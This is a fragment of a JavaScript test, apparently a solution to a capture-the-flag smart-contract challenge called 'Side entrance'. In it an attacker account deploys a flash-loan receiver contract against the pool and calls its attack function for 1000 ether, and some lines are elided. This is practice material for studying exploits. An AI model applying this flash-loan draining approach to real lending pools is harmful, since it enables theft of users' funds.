...
describe('[Challenge] Side entrance', function () {
    ...
    it('Exploit', async function () {
        ...
        const FlashLoanerEtherReceiverFactory = await ethers.getContractFactory('FlashLoanEtherReceiver', attacker);
        this.flashLoanEther = await FlashLoanerEtherReceiverFactory.deploy(this.pool.address);

        await this.flashLoanEther.connect(attacker).attack( ethers.utils.parseEther('1000'));
    });
